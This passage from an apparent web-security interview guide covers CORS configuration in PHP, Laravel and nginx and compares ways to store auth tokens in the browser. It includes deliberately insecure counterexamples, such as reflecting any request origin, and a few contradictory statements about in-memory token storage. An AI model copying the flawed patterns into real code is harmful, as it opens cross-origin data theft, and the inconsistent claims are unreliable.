        header("Access-Control-Allow-Credentials: true");
        
        // Allowed methods
        header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
        
        // Allowed headers
        header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
        
        // Max age (cache preflight response)
        header("Access-Control-Max-Age: 3600");
        
        // Handle preflight
        if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
            http_response_code(204);
            exit;
        }
    }
}

// Use in your entry point
$cors = new CorsMiddleware();
$cors->handle();
```

#### Laravel Implementation

```php
<?php
// app/Http/Middleware/Cors.php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class Cors
{
    public function handle(Request $request, Closure $next)
    {
        $allowedOrigins = config('cors.allowed_origins', []);
        $origin = $request->header('Origin');

        // Check if origin is allowed
        if (in_array($origin, $allowedOrigins, true)) {
            return $next($request)
                ->header('Access-Control-Allow-Origin', $origin)
                ->header('Access-Control-Allow-Credentials', 'true')
                ->header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With')
                ->header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
                ->header('Access-Control-Max-Age', '3600');
        }

        return $next($request);
    }
}
```

```php
// config/cors.php
return [
    'allowed_origins' => [
        'https://app.example.com',
        'https://admin.example.com',
    ],
    'allowed_methods' => ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    'allowed_headers' => ['Content-Type', 'Authorization'],
    'max_age' => 3600,
];
```

```php
// routes/api.php - Handle preflight for API routes
Route::options('{any}', function () {
    return response('', 204);
})->where('any', '.*');

// Or register middleware globally in Kernel
// protected $middleware = [
//     \App\Http\Middleware\Cors::class,
// ];
```

#### nginx Configuration

```nginx
# Add CORS headers at server level
location /api/ {
    # Handle preflight
    if ($request_method = 'OPTIONS') {
        add_header 'Access-Control-Allow-Origin' 'https://app.example.com';
        add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS';
        add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization';
        add_header 'Access-Control-Max-Age' 3600;
        add_header 'Content-Type' 'text/plain charset=UTF-8';
        add_header 'Content-Length' 0;
        return 204;
    }

    # Normal requests
    add_header 'Access-Control-Allow-Origin' 'https://app.example.com' always;
    add_header 'Access-Control-Allow-Credentials' 'true' always;
}
```

### Important CORS Headers

| Header | Purpose | Example |
|--------|---------|---------|
| `Access-Control-Allow-Origin` | Allowed origin | `https://app.example.com` or `*` |
| `Access-Control-Allow-Methods` | Allowed HTTP methods | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Allowed request headers | `Content-Type, Authorization` |
| `Access-Control-Allow-Credentials` | Allow cookies | `true` (cannot use with `*`) |
| `Access-Control-Max-Age` | Preflight cache duration | `3600` |
| `Access-Control-Expose-Headers` | Expose headers to JS | `X-Total-Count` |

### Common Issues

```php
<?php
// ❌ Bad: Allow credentials with wildcard
header("Access-Control-Allow-Origin: *");        // Invalid with credentials
header("Access-Control-Allow-Credentials: true"); // Won't work!

// ✅ Good: Specific origin with credentials
header("Access-Control-Allow-Origin: https://app.example.com");
header("Access-Control-Allow-Credentials: true");

// ✅ Good: Wildcard without credentials
header("Access-Control-Allow-Origin: *");
// No credentials allowed
```

### Security Considerations

```php
<?php
// ❌ Bad: Reflect any origin (allows any site)
$origin = $_SERVER['HTTP_ORIGIN'];
header("Access-Control-Allow-Origin: {$origin}");  // DANGEROUS!

// ✅ Good: Whitelist allowed origins
$allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
if (in_array($_SERVER['HTTP_ORIGIN'], $allowedOrigins, true)) {
    header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
}

// ✅ Good: Use environment-based configuration
$allowedOrigins = explode(',', env('CORS_ALLOWED_ORIGINS', ''));
if (in_array($_SERVER['HTTP_ORIGIN'], array_map('trim', $allowedOrigins), true)) {
    header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
}
```

**Follow-up:**
- What's the difference between simple and non-simple requests?
- Can CORS be bypassed?
- How does CORS relate to Same-Origin Policy?

**Key Points:**
- CORS is browser-enforced, not server-enforced
- Server sends CORS headers in response
- Preflight (OPTIONS) for non-simple requests
- Whitelist origins, don't echo back arbitrary origins
- Can't use `*` with `Access-Control-Allow-Credentials: true`

---

## Question 16: Where is it better to store auth token on frontend? Pros and cons.

**Answer:**

Storing authentication tokens securely is critical for web application security.

### Storage Options Comparison

```
┌─────────────────────────────────────────────────────────────────┐
│                    Token Storage Options                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  LocalStorage          SessionStorage         HttpOnly Cookie  │
│  ─────────────         ───────────────        ───────────────  │
│  Easy to access        Cleared on tab close   Protected from   │
│  Accessible to JS      Less persistent        JavaScript       │
│  XSS vulnerable        XSS vulnerable         CSRF vulnerable  │
│                                                                  │
│  Memory (JS variable)  Memory (JS variable)  Browser memory   │
│  Persists refresh      Cleared on refresh    Persists refresh  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Option 1: LocalStorage

```javascript
// Store token
localStorage.setItem('auth_token', token);

// Retrieve token
const token = localStorage.getItem('auth_token');

// Remove token
localStorage.removeItem('auth_token');

// Use in API calls
fetch('/api/data', {
    headers: {
        'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
    }
});
```

| Pros | Cons |
|------|------|
| Easy to implement | Vulnerable to XSS attacks |
| Persists across sessions | Token accessible to all JS |
| Works with CORS | Can't use HttpOnly flag |
| No extra configuration | Large token size can cause issues |

### Option 2: SessionStorage

```javascript
// Store token - cleared when tab closes
sessionStorage.setItem('auth_token', token);

// Retrieve token
const token = sessionStorage.getItem('auth_token');

// Clear on logout
sessionStorage.removeItem('auth_token');
```

| Pros | Cons |
|------|------|
| Cleared on tab close (security) | Lost on page refresh |
| Slightly less exposure than localStorage | Not suitable for long sessions |
| Better for sensitive apps | User has to log in more often |

### Option 3: HttpOnly Cookies (Recommended)

```php
<?php
// Server sets HttpOnly cookie
$cookieOptions = [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => null,
    'secure' => true,          // HTTPS only
    'httponly' => true,        // Not accessible to JS
    'samesite' => 'strict',   // CSRF protection
];

setcookie('auth_token', $token, $cookieOptions);
```

```javascript
// Laravel example - token in cookie
// Cookie is automatically sent with requests
// No explicit token handling needed in JavaScript
```

| Pros | Cons |
|------|------|
| Protected from XSS (HttpOnly) | Vulnerable to CSRF attacks |
| Browser handles storage | Requires CSRF protection |
| Automatic with requests | Can't be used for API-only auth |
| Server has full control | More complex setup |

### Option 4: In-Memory (JavaScript Variable)

```javascript
// Store in memory
let authToken = null;

// Set token
function setToken(token) {
    authToken = token;
}

// Get token
function getToken() {
    return authToken;
}

// Clear token
function clearToken() {
    authToken = null;
}
```

| Pros | Cons |
|------|------|
| Protected from XSS | Lost on page refresh |
| Fast access | User must re-authenticate |
| No persistence | Not suitable for SPAs |

### Option 5: Combined Strategy (Best Practice)

```javascript
// Short-lived access token in memory
// Long-lived refresh token in HttpOnly cookie

// 1. Store access token in memory (Vue/Pinia store)
const authStore = useAuthStore();
authStore.setAccessToken(response.access_token);

// 2. Refresh token in HttpOnly cookie (server sets)
// Cookie automatically sent with requests

// 3. Use access token for API calls
const token = authStore.accessToken;
if (token) {
    // Make API request
}

// 4. Auto-refresh when expired
async function refreshToken() {
    const response = await fetch('/api/refresh', { 
        method: 'POST',
        credentials: 'include'  // Include cookies
    });
    const data = await response.json();
    authStore.setAccessToken(data.access_token);
}
```

### Security Comparison

```
Security Properties:

                    XSS     CSRF    Persistence    Complexity
LocalStorage        ❌      ✅      High            Low
SessionStorage      ❌      ✅      Medium          Low
HttpOnly Cookie    ✅      ❌      High            Medium
Memory              ✅      ✅      Low             Low
Combined            ✅      ⚠️      High            High
```

### Recommendations by Use Case

```javascript
// Single Page Application (SPA) with API backend
// → HttpOnly cookies + CSRF token

// Public/simple API
// → LocalStorage (with short tokens, refresh tokens)

// Highly sensitive application (banking)
// → Memory + short sessions + HttpOnly cookies

// Mobile app
// → Encrypted storage (Keychain/Keystore)
```

### Vue.js Implementation Example

```javascript
// Pinia store
import { defineStore } from 'pinia';

export const useAuthStore = defineStore('auth', {
    state: () => ({
        accessToken: null,
    }),
    getters: {
        isAuthenticated: (state) => !!state.accessToken,
    },
    actions: {
        async login(credentials) {
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(credentials),
                credentials: 'include',  // For cookies
            });
            
            const data = await response.json();
            this.accessToken = data.access_token;
        },
        logout() {
            this.accessToken = null;
        },
    },
});
```

### CSRF Protection with Cookies

```javascript
// Include CSRF token in requests
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/data', {
    headers: {
        'X-CSRF-TOKEN': csrfToken,
        'Authorization': `Bearer ${token}`
    }
});

// Laravel automatically handles CSRF for same-origin requests
// For cross-origin, use withCredentials
fetch('https://api.example.com/data', {
    credentials: 'include'
});
```

**Follow-up:**
- What's the difference between XSS and CSRF?
- How does SameSite cookie attribute help?
- Can HttpOnly cookies be stolen?

**Key Points:**
- LocalStorage: Easy but XSS vulnerable
- HttpOnly Cookies: Protected from XSS, needs CSRF protection
- Memory: Most secure but not persistent
- Best: Combined approach (memory + HttpOnly cookie)
- Always use HTTPS for token transmission

---

## Notes

Add more questions covering:
- XML External Entity (XXE) attacks
- Server-Side Request Forgery (SSRF)
- Insecure deserialization
- Security headers (HSTS, X-Frame-Options, etc.)
- API authentication (OAuth, JWT)
- Input validation and sanitization
- Clickjacking protection
- Open redirect vulnerabilities
